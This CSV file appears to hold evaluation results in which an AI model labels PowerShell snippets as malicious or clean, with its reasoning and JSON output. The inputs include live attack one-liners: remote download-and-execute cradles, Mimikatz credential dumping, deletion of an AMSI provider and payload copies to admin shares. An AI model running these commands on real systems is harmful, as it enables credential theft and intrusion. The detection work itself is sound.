model_name,description,is_malicious,reasoning,answer,tag,explain,input,total_tokens
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0073,Malicious,"We need to produce JSON with required fields: summary, evidence (array), explain, is_malicious, tag (optional? required? In schema, tag is not required, but we can include). Provide evidence: the code segment ""Invoke-Expression -Command \""Invoke-Mimikatz\"""" suspicious. Tag: EXECUTION, CREDENTIAL_ACCESS maybe. Also maybe DEFENSE_EVASION? Not needed.

Classify: Malicious (definitely offensive). Provide summary: script attempts to run Mimikatz via Invoke-Expression.

Explain: Use of Invoke-Expression to execute a function that runs Mimikatz, which extracts credentials.

Provide evidence array with code, explanation, tag.

Tag field: maybe ""CREDENTIAL_ACCESS"" or ""EXECUTION"". Choose ""CREDENTIAL_ACCESS"". Provide is_malicious: ""Malicious"". Provide overall tag: maybe ""CREDENTIAL_ACCESS"". Provide explain: This script is malicious because it runs Mimikatz to dump credentials.

Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence optional but we include.

Let's craft.","{
  ""summary"": ""The script invokes Mimikatz via Invoke‑Expression, which is used to dump credentials from memory."",
  ""evidence"": [
    {
      ""code"": ""Invoke-Expression -Command \""Invoke-Mimikatz\"""",
      ""code_explain"": ""Invoke-Expression executes a string as PowerShell code, bypassing normal command parsing. The string calls the function Invoke‑Mimikatz, a known wrapper for the Mimikatz tool that extracts plaintext passwords, NTLM hashes, and Kerberos tickets from the LSASS process. Executing Mimikatz is a classic credential‑access technique."",
      ""tag"": ""CREDENTIAL_ACCESS""
    }
  ],
  ""explain"": ""The script directly runs Mimikatz, a well‑known post‑exploitation tool for harvesting credentials. This behavior is clearly malicious and aligns with credential‑access techniques."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""CREDENTIAL_ACCESS""
}",,,"# Natural language intent:
# Execute Mimikatz using Invoke-Expression.

Invoke-Expression -Command ""Invoke-Mimikatz""
",1465
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0079,Malicious,"We need to analyze the provided PowerShell content: ""Invoke-Command -ComputerName <target> -ScriptBlock {powershell -nop -w hidden -c <command>}"". This is a generic command to execute a hidden PowerShell command on a remote computer using Invoke-Command. It's suspicious because remote execution, hidden window, -nop (no profile), -w hidden (window hidden). However without actual command payload, we cannot know if malicious. It's a technique used by attackers for remote code execution and defense evasion. So classification likely ""Likely"" because suspicious but no concrete malicious payload.

We need to produce JSON with fields summary, evidence (array), explain, is_malicious, tag.

Evidence: code segment: the whole command. Tag: REMOTE_COMMAND_EXECUTION, DEFENSE_EVASION, OBFUSCATION? Not exactly obfuscation. Use of -w hidden is defense evasion. Use of Invoke-Command remote execution is remote command execution.

Explain: The script uses Invoke-Command to run a PowerShell instance with -nop -w hidden on a remote target, which is a typical technique for stealthy remote execution. No payload shown, so cannot confirm malicious, but behavior is suspicious.

Tag: maybe ""REMOTE_COMMAND_EXECUTION"". Provide is_malicious: Likely.

Let's craft JSON.","{
  ""summary"": ""Runs a PowerShell instance with no profile and a hidden window on a remote computer via Invoke-Command."",
  ""evidence"": [
    {
      ""code"": ""Invoke-Command -ComputerName <target> -ScriptBlock {powershell -nop -w hidden -c <command>}"",
      ""code_explain"": ""Uses Invoke-Command to execute code on a remote host. Inside the script block a new PowerShell process is launched with '-nop' (no profile) and '-w hidden' (window hidden), which are common techniques for stealthy remote command execution and defense evasion. The actual payload (<command>) is not disclosed, but the pattern matches attacker‑style remote execution."",
      ""tag"": ""REMOTE_COMMAND_EXECUTION""
    },
    {
      ""code"": ""powershell -nop -w hidden -c <command>"",
      ""code_explain"": ""The '-nop' switch bypasses loading of user profiles, reducing forensic artifacts, while '-w hidden' suppresses the console window, both of which are typical defense‑evasion tactics. The command string is supplied via '-c', allowing arbitrary code execution."",
      ""tag"": ""DEFENSE_EVASION""
    }
  ],
  ""explain"": ""The script demonstrates remote execution of an arbitrary PowerShell command in a hidden, profile‑less context, a technique frequently used by attackers to run malicious payloads stealthily. Because the actual command payload is not shown, the content cannot be definitively labeled malicious, but the behavior is highly suspicious."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""REMOTE_COMMAND_EXECUTION""
}",,,"# Natural language intent:
# Execute a hidden PowerShell command

Invoke-Command -ComputerName <target> -ScriptBlock {powershell -nop -w hidden -c <command>}
",1671
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0080,Malicious,"We need to produce JSON per schema. Analyze script.

Script:

$profile = $profile + ""`n"" + ""Invoke-Mimikatz""; Invoke-Expression $profile

Explanation: It appends a line ""Invoke-Mimikatz"" to the PowerShell profile (the script that runs at startup) and then executes the profile via Invoke-Expression, causing immediate execution. This is persistence (modifying profile) and execution of Mimikatz (credential dumping). Also uses Invoke-Expression (execution of dynamic code). So malicious.

Evidence: code segment: ""$profile = $profile + ""`n"" + ""Invoke-Mimikatz""; Invoke-Expression $profile""

Tag: PERSISTENCE (modifying profile) and CREDENTIAL_ACCESS (Mimikatz) and EXECUTION (Invoke-Expression). Could choose primary tag maybe ""CREDENTIAL_ACCESS"" or ""PERSISTENCE"". Provide one tag per evidence; maybe list multiple? Schema expects a single tag string. Choose ""CREDENTIAL_ACCESS"" as primary.

Provide summary, explain, is_malicious = ""Malicious"", tag maybe ""CREDENTIAL_ACCESS"". Provide evidence array with one object.

Return JSON.","{
  ""summary"": ""The script modifies the PowerShell profile to include a call to Invoke‑Mimikatz and then immediately executes the altered profile."",
  ""evidence"": [
    {
      ""code"": ""$profile = $profile + \""`n\"" + \""Invoke-Mimikatz\""; Invoke-Expression $profile"",
      ""code_explain"": ""The command appends the string \""Invoke-Mimikatz\"" to the user's PowerShell $profile, which is automatically run at every PowerShell start – this creates persistence. It then runs the entire $profile content via Invoke‑Expression, causing the newly added Invoke‑Mimikatz call to execute immediately. Invoke‑Mimikatz is a well‑known credential‑dumping tool, so the script is attempting to harvest credentials and retain the capability for future sessions."",
      ""tag"": ""CREDENTIAL_ACCESS""
    }
  ],
  ""explain"": ""The script directly injects a credential‑dumping command (Invoke‑Mimikatz) into the PowerShell startup profile and executes it, which is a classic technique for persistence and credential theft. This behavior is clearly malicious."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""CREDENTIAL_ACCESS""
}",,,"# Natural language intent:
# Attempt to load Mimikatz into the PowerShell profile for future execution.

$profile = $profile + ""`n"" + ""Invoke-Mimikatz""; Invoke-Expression $profile
",1546
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0094,Malicious,"We need to produce JSON per schema. Summarize: script invokes remote command to download and execute script from malicious site. Identify evidence: Invoke-Command remote execution, IEX downloadstring, etc. Tags: REMOTE_COMMAND_EXECUTION, DOWNLOADER, EXECUTION, OBFUSCATION maybe not. Provide explanation. Determine is_malicious: Malicious. Tag: maybe ""REMOTE_COMMAND_EXECUTION"" or ""DOWNLOADER"". Provide evidence array.

Need to follow schema: properties: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Required: summary, is_malicious, explain. Provide those.

Let's craft.

","{
  ""summary"": ""The script uses Invoke‑Command to run a script block on a remote computer that downloads and executes code from an external URL."",
  ""evidence"": [
    {
      ""code"": ""Invoke-Command -ComputerName <target> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script') }"",
      ""code_explain"": ""Invoke-Command performs remote command execution on the specified <target>. Inside the script block, IEX (Invoke‑Expression) evaluates the string returned by (New-Object Net.WebClient).DownloadString(...), which fetches a PowerShell script from an external HTTP server and runs it in memory. This combination is a classic downloader‑payload technique and is highly indicative of malicious activity."",
      ""tag"": ""REMOTE_COMMAND_EXECUTION""
    },
    {
      ""code"": ""(New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script')"",
      ""code_explain"": ""Net.WebClient.DownloadString retrieves data from a remote URL over clear‑text HTTP. The retrieved content is later executed, providing a dynamic, server‑controlled payload. Downloading executable code from an untrusted external site is a strong indicator of a downloader behavior."",
      ""tag"": ""DOWNLOADER""
    },
    {
      ""code"": ""IEX ..."",
      ""code_explain"": ""IEX (Invoke‑Expression) evaluates a string as PowerShell code, allowing the attacker to execute arbitrary commands received from the remote server. This is a common technique for in‑memory execution that bypasses writing files to disk."",
      ""tag"": ""EXECUTION""
    }
  ],
  ""explain"": ""The script performs remote command execution, downloads a script from an untrusted HTTP server, and runs it directly in memory. These behaviors match well‑known attacker techniques for lateral movement and payload delivery, making the script clearly malicious."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""REMOTE_COMMAND_EXECUTION""
}",,,"# Natural language intent:
# Invoke a command on a remote computer to download and execute a malicious script.

Invoke-Command -ComputerName <target> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script') }
",1647
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0108,Malicious,"We need to produce JSON per schema. Analyze script: it uses iex (Invoke-Expression) to download and execute a script from remote URL, then calls Invoke-WCMDump (likely a function defined in that script) to dump Windows credentials. This is malicious behavior: remote code execution, downloader, credential access. Provide summary, evidence with code segments, tags.

Evidence: code segment ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')"" -> tags: DOWNLOADER, EXECUTION, DEFENSE_EVASION (using iex). Also remote command execution.

Second segment: ""Invoke-WCMDump"" -> tag: CREDENTIAL_ACCESS, DISCOVERY maybe.

Provide explanation.

Classification: Malicious.

Tag: ""CREDENTIAL_ACCESS"" or maybe ""DOWNLOADER"". Choose primary: ""CREDENTIAL_ACCESS"" as script aims to dump credentials.

Now produce JSON with required fields: summary, evidence array, explain, is_malicious, tag (general category). Also include optional fields like iocs? Not required.

Let's craft.

","{
  ""summary"": ""The script downloads and executes a remote PowerShell payload and then runs a function to dump Windows credentials."",
  ""evidence"": [
    {
      ""code"": ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')"",
      ""code_explain"": ""Uses `New-Object Net.WebClient` to fetch a script from an external URL and pipes it to `Invoke-Expression` (iex). This is a classic downloader technique that enables remote code execution and bypasses static file inspection."",
      ""tag"": ""DOWNLOADER""
    },
    {
      ""code"": ""Invoke-WCMDump"",
      ""code_explain"": ""Calls a function (presumably defined in the downloaded script) that extracts Windows Credential Manager data. This directly accesses stored credentials, a clear indicator of credential‑access behavior."",
      ""tag"": ""CREDENTIAL_ACCESS""
    }
  ],
  ""explain"": ""The script performs remote code download and execution followed by a credential‑dumping routine, matching multiple malicious indicators (downloader, remote execution, credential access)."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""CREDENTIAL_ACCESS""
}",,,"# Natural language intent:
# Download and execute a script from a remote URL to dump Windows credentials.

iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1') ; Invoke-WCMDump
",1592
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0109,Malicious,"We need to produce JSON with required fields: summary, is_malicious, explain, optional evidence, tag. The script is just ""Get-GPPPassword"". That's a built-in PowerShell function from the PowerSploit module (or other). It retrieves GPP stored passwords, which is credential access. It's a legitimate admin tool but can be used maliciously. The script is just a single command. It's suspicious because it accesses stored passwords. So classification: Likely? Since it's clearly credential access. It's malicious if used by attacker. The script itself is just a call; could be benign admin. According to guidelines, if it exhibits credential access, classify as Malicious? The instruction: ""If the script exhibits at least one malicious or offensive PowerShell indicator listed above or other suspicious indicators, classify it as Malicious or Likely."" Since it's a credential access tool, it's suspicious. Might be ""Likely"" because context unknown. I'd choose ""Likely"". Provide evidence: code segment ""Get-GPPPassword"". Tag: CREDENTIAL_ACCESS. Provide explanation. Also maybe OBFUSCATION none. Provide summary: script attempts to retrieve Group Policy Preferences stored passwords. Provide explain: This command extracts credentials from GPP, which is a known credential dumping technique, indicating malicious intent. Provide tag: CREDENTIAL_ACCESS. Return JSON.","{
  ""summary"": ""The script runs the Get‑GPPPassword cmdlet to extract passwords stored in Group Policy Preferences."",
  ""evidence"": [
    {
      ""code"": ""Get-GPPPassword"",
      ""code_explain"": ""Invokes the PowerSploit/Get‑GPPPassword function, which reads the XML files used by Group Policy Preferences to store plaintext credentials. Accessing these files is a known credential‑dumping technique used by attackers to harvest domain admin or service account passwords."",
      ""tag"": ""CREDENTIAL_ACCESS""
    }
  ],
  ""explain"": ""The sole command directly extracts stored credentials from the system, which is a classic credential‑access behavior. While the cmdlet can be used by legitimate administrators, its presence in an unknown script strongly indicates malicious intent."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""CREDENTIAL_ACCESS""
}",,,"# Natural language intent:
# Retrieve Group Policy Preferences passwords.

Get-GPPPassword
",1494
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0118,Malicious,"We need to produce JSON per schema. The script is a simple Start-BitsTransfer command. This is a legitimate PowerShell cmdlet used for downloading files. Could be used maliciously as downloader. Indicators: remote download. No obfuscation. It's a downloader behavior. Could be malicious if remote source is untrusted. But based on code alone, it's a downloader. Classification: Likely (suspicious) because it's a downloader but not inherently malicious. Provide summary, evidence with code segment, tag ""DOWNLOADER"". Explain. is_malicious: Likely. tag: ""DOWNLOADER"". Provide explain. Provide evidence array. Ensure required fields: summary, is_malicious, explain. evidence optional but we include. Provide JSON.","{
  ""summary"": ""The script initiates a foreground BITS transfer to download a file from a remote URL to a local path."",
  ""evidence"": [
    {
      ""code"": ""Start-BitsTransfer -Priority foreground -Source ${remote_file} -Destination ${local_file}"",
      ""code_explain"": ""Uses the built‑in Start-BitsTransfer cmdlet to retrieve a file from a remote location. Downloading external content is a common technique for attackers to fetch additional payloads, making this a downloader behavior."",
      ""tag"": ""DOWNLOADER""
    }
  ],
  ""explain"": ""The script performs a remote file download via BITS, which is a typical initial step in many malicious infection chains. While the command itself is legitimate, its use to fetch arbitrary remote content without validation is suspicious and aligns with downloader behavior."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""DOWNLOADER""
}",,,"# Natural language intent:
# Start a foreground BITS transfer from a remote source to a local destination.

Start-BitsTransfer -Priority foreground -Source ${remote_file} -Destination ${local_file}
",1406
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0120,Malicious,"We need to produce JSON per schema. The script is a simple Remove-Item targeting a registry key for AMSI provider. This is a defense evasion technique: removing AMSI provider to bypass detection. So malicious? Could be legitimate admin removing a provider, but generally removing AMSI provider is suspicious. The script is clearly targeting AMSI registry key, which is a known technique to disable AMSI. So classify as Malicious (defense evasion). Provide evidence: code line, explanation, tag ""DEFENSE_EVASION"". Also maybe ""PERSISTENCE""? No. So summary: script removes AMSI provider registry key to disable AMSI. Provide explanation. Tag overall: ""DEFENSE_EVASION"". Provide is_malicious: ""Malicious"". Provide explain: because it attempts to delete AMSI provider registry key, which is a known technique to bypass AMSI and evade detection. Provide evidence array with one object.

Make sure JSON matches schema: properties: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (optional? but schema includes tag property but not required). We'll include tag.

Return JSON only.","{
  ""summary"": ""The script deletes a specific AMSI provider registry key, effectively disabling that AMSI component."",
  ""evidence"": [
    {
      ""code"": ""Remove-Item -Path \""HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\"" -Recurse"",
      ""code_explain"": ""Uses the Remove-Item cmdlet to delete a registry key under HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers. Deleting an AMSI provider disables its ability to scan PowerShell scripts, which is a known defense‑evasion technique used by attackers to bypass AMSI‑based detection."",
      ""tag"": ""DEFENSE_EVASION""
    }
  ],
  ""explain"": ""The script targets and removes an AMSI provider registry entry, a direct attempt to subvert Windows Antimalware Scan Interface (AMSI) and evade detection of malicious PowerShell code. This behavior is characteristic of offensive tooling."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""DEFENSE_EVASION""
}",,,"# Natural language intent:
# Remove a specific AMSI provider registry key.

Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse
",1559
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0130,Malicious,"We need to produce JSON per schema. The script is just ""Invoke-Inveigh -Inspect"". That's a command to run Inveigh tool in inspection mode. Inveigh is a PowerShell tool for LLMNR/NBT-NS spoofing and credential harvesting. Running it in inspection mode likely monitors network traffic for potential attacks, not necessarily malicious. However the presence of Inveigh indicates offensive security tool. The script itself just invokes the function. No obvious malicious behavior, but the tool can be used for credential theft. The script is not inherently malicious; it's a legitimate security testing tool. Classification: Likely? The script is just a command to run a known offensive tool. Could be used maliciously. Since no evidence of malicious behavior beyond invoking tool, we might label as ""Likely"" because it's suspicious but context missing. Tag maybe ""DISCOVERY"" or ""LATERAL_MOVEMENT""? Inveigh does credential harvesting (CREDENTIAL_ACCESS) and network spoofing (LATERAL_MOVEMENT). But the command is just -Inspect, which is a passive mode. So maybe ""DISCOVERY"". We'll produce evidence: code segment ""Invoke-Inveigh -Inspect"". Explanation: Calls Inveigh function, which can perform LLMNR/NBT-NS spoofing and credential capture; -Inspect runs in passive monitoring mode, still can be used for reconnaissance. Tag: DISCOVERY or CREDENTIAL_ACCESS? I'd choose ""DISCOVERY"". Classification: Likely (since tool is offensive). Provide summary. Provide explain. Provide tag: ""DISCOVERY"". Provide is_malicious: ""Likely"". Provide evidence array with one item.

Let's craft JSON.","{
  ""summary"": ""The script invokes the Inveigh PowerShell tool in inspection mode, which is used for network credential harvesting and LLMNR/NBT-NS spoofing."",
  ""evidence"": [
    {
      ""code"": ""Invoke-Inveigh -Inspect"",
      ""code_explain"": ""Calls the Inveigh function. Inveigh is a known offensive security tool that can sniff LLMNR/NBT-NS traffic, perform spoofing, and capture NTLM hashes. The -Inspect flag runs it in a passive monitoring mode, still allowing the tool to observe credential‑related network traffic, which is a reconnaissance activity."",
      ""tag"": ""DISCOVERY""
    }
  ],
  ""explain"": ""Running Inveigh, even in passive inspection mode, is indicative of credential‑access or discovery activity and is typically used by attackers or red‑team operators. The script itself does not contain additional malicious payloads, but the presence of an offensive tool makes the intent suspicious."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""DISCOVERY""
}",,,"# Natural language intent:
# Run the Inveigh tool in inspection mode.

Invoke-Inveigh -Inspect
",1608
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0131,Malicious,"We need to produce JSON per schema. The script is creating a new Windows service and starting it. This could be legitimate admin task, but also can be used for persistence. No obvious malicious indicators like downloading, obfuscation, etc. However creating a service is a persistence technique. The script uses variables ServiceName and BinaryPath, presumably provided externally. Without context, could be benign admin. According to guidelines, we need to classify. Since it's a persistence technique, but could be legitimate. Likely? The script is suspicious because creating a service can be used maliciously. But no evidence of malicious intent. I'd classify as Likely (suspicious) with tag PERSISTENCE. Provide evidence: New-Service command and Start-Service command. Summarize: script creates and starts a Windows service. Explanation: This can be used for persistence. Provide evidence.

Return JSON with required fields: summary, evidence (array), explain, is_malicious, tag (general category). Tag maybe ""PERSISTENCE"". Provide evidence items with code, code_explain, tag.

Let's craft.","{
  ""summary"": ""The script creates a new Windows service with a given name and binary path, then starts that service."",
  ""evidence"": [
    {
      ""code"": ""New-Service -Name \""${ServiceName}\"" -BinaryPathName \""${BinaryPath}\"""",
      ""code_explain"": ""Uses the built‑in New-Service cmdlet to register a Windows service. Creating a service is a common persistence technique because the service can be configured to run automatically at system boot, and it can execute arbitrary binaries with system privileges."",
      ""tag"": ""PERSISTENCE""
    },
    {
      ""code"": ""Start-Service -Name \""${ServiceName}\"""",
      ""code_explain"": ""Immediately starts the newly created service. Starting the service ensures the payload (the binary at ${BinaryPath}) runs right away, which is typical of attacker‑controlled service deployment."",
      ""tag"": ""EXECUTION""
    }
  ],
  ""explain"": ""The script performs actions that are frequently used by attackers to achieve persistence and execute arbitrary code, but the code itself contains no obvious malicious payload, download, or credential‑stealing behavior. Without additional context it is suspicious but not definitively malicious."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""PERSISTENCE""
}",,,"# Natural language intent:
# Create a new Windows service with a specified name and binary path, then start the service.

New-Service -Name ""${ServiceName}"" -BinaryPathName ""${BinaryPath}"" ; Start-Service -Name ""${ServiceName}""
",1555
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0135,Malicious,"We need to produce JSON per schema. Analyze script.

Script:

$path = ""sandcat.go-windows""; ; $drive = ""\\${remote.host.fqdn}\C$""; ; Copy-Item -v -Path $path -Destination $drive""\Users\Public\s4ndc4t.exe"";

Observations: It copies a file named sandcat.go-windows to remote host's C$ admin share, into Users\Public\s4ndc4t.exe. This is typical lateral movement / remote file copy for deployment of malware (Sandcat is a known Cobalt Strike beacon). This is suspicious: remote file copy to admin share, likely for persistence or execution later. Tag: LATERAL_MOVEMENT, PERSISTENCE maybe, DOWNLOADER? Not a downloader but remote copy.

No obfuscation. So evidence: the Copy-Item command with UNC path.

Classify as Malicious (definitely offensive). Tag maybe ""LATERAL_MOVEMENT"" or ""PERSISTENCE"". Choose primary tag: LATERAL_MOVEMENT.

Provide summary: script copies Sandcat executable to remote system's Public folder via admin share.

Explain: uses UNC admin share to place malicious executable, enabling later execution.

Provide evidence array with code segment and explanation.

Return JSON.","{
  ""summary"": ""The script copies a file named \""sandcat.go-windows\"" to a remote Windows host’s C$ administrative share, placing it in the Public folder as s4ndc4t.exe."",
  ""evidence"": [
    {
      ""code"": ""Copy-Item -v -Path $path -Destination $drive\""\\Users\\Public\\s4ndc4t.exe\"";"",
      ""code_explain"": ""Uses PowerShell’s Copy-Item cmdlet to write a file to a UNC path that references the remote host’s C$ admin share (\\\\${remote.host.fqdn}\\C$). Writing a malicious executable to the Public folder on a remote system is a classic lateral‑movement and staging technique, allowing the attacker to later execute the payload on the target."",
      ""tag"": ""LATERAL_MOVEMENT""
    }
  ],
  ""explain"": ""The script performs a remote file copy of a known malicious payload (Sandcat) to a remote system via an administrative share, which is a clear indicator of offensive activity for lateral movement and potential persistence."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""LATERAL_MOVEMENT""
}",,,"# Natural language intent:
# Copy Sandcat executable to a remote system's 'Public' folder on the C drive.

$path = ""sandcat.go-windows""; ; $drive = ""\\${remote.host.fqdn}\C$""; ; Copy-Item -v -Path $path -Destination $drive""\Users\Public\s4ndc4t.exe"";
",1607
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0141,Clean,"We need to produce JSON per schema. The script is a simple Get-ADUser query with filter for useraccountcontrol flag and format table. No malicious behavior. So classification Clean. Provide summary, evidence empty array, explain why not malicious, is_malicious Clean, tag maybe ""DISCOVERY"" but since Clean maybe no tag? The schema includes optional tag property. Could include ""DISCOVERY"". Provide.

Let's craft.","{
  ""summary"": ""The script queries Active Directory for user accounts that have the specific UserAccountControl flag 4194304 and displays their names in a table."",
  ""evidence"": [],
  ""explain"": ""The code only performs a read‑only AD query and formats the output. It does not contain any remote execution, credential harvesting, persistence, privilege escalation, obfuscation, or other suspicious behavior. Therefore it is benign."",
  ""is_malicious"": ""Clean"",
  ""tag"": ""DISCOVERY""
}",,,"# Natural language intent:
# Retrieve Active Directory users with specific account control flags and format the output table.

Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
",1262
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0145,Clean,"We need to produce JSON with required fields: summary, evidence (array), explain, is_malicious, tag (optional? required? In schema, tag not required but can include). Provide classification. The script is a simple command using a custom function Get-BrowserInformation to retrieve IE bookmarks for a user. No malicious indicators. So Clean. Evidence empty array. Tag maybe ""DISCOVERY"" but since clean, tag maybe omitted or null. Provide summary. Provide explain. Provide is_malicious ""Clean"". Provide tag maybe ""DISCOVERY"" but not needed. The schema requires summary, is_malicious, explain. evidence optional. Provide empty array. Provide tag maybe ""DISCOVERY"". But tag field is required? Not in required list. So optional. We'll include tag ""DISCOVERY"" maybe but script is benign. Could set tag ""DISCOVERY"". But classification Clean. Provide.","{
  ""summary"": ""The script calls a custom cmdlet Get-BrowserInformation to enumerate Internet Explorer bookmarks for the user 'user3'."",
  ""evidence"": [],
  ""explain"": ""The command only reads browser bookmark data for a specified user and does not contain any remote execution, credential harvesting, persistence, obfuscation, or other suspicious behavior. No indicators of malicious activity are present."",
  ""is_malicious"": ""Clean"",
  ""tag"": ""DISCOVERY""
}",,,"# Natural language intent:
# Retrieve Internet Explorer bookmarks information for a specified user.

Get-BrowserInformation -Browser IE -Datatype Bookmarks -UserName user3
",1333
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0146,Malicious,"We need to produce JSON per schema. Summarize, evidence, explain, is_malicious, tag.

Script: IEX (New-Object Net.WebClient).DownloadString('http://illegal-website.com/kidHack.ps1')

Behavior: downloader, remote code execution, execution, possibly malicious. Evidence: code segment, explanation, tag: DOWNLOADER, EXECUTION, REMOTE_COMMAND_EXECUTION maybe.

Overall classification: Malicious.

Tag: DOWNLOADER or EXECUTION. Choose general category: DOWNLOADER.

Provide summary: script downloads and executes remote PowerShell script from untrusted site.

Explain: malicious because it fetches and runs code from internet without verification.

Provide evidence array with one object.

Return JSON.","{
  ""summary"": ""The script downloads a PowerShell file from an external HTTP URL and immediately executes it in the current session."",
  ""evidence"": [
    {
      ""code"": ""IEX (New-Object Net.WebClient).DownloadString('http://illegal-website.com/kidHack.ps1')"",
      ""code_explain"": ""The command creates a .NET WebClient object, fetches the raw contents of a remote script via HTTP, and pipes it to IEX (Invoke‑Expression), which executes the downloaded code without any validation. This pattern is a classic downloader/back‑door technique used for remote code execution."",
      ""tag"": ""DOWNLOADER""
    }
  ],
  ""explain"": ""The script performs an unauthenticated download of executable PowerShell code from an untrusted Internet source and runs it directly, which is a clear indicator of malicious behavior."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""DOWNLOADER""
}",,,"# Natural language intent:
# Download and execute a PowerShell script from a potentially illegal website.

IEX (New-Object Net.WebClient).DownloadString('http://illegal-website.com/kidHack.ps1')
",1415
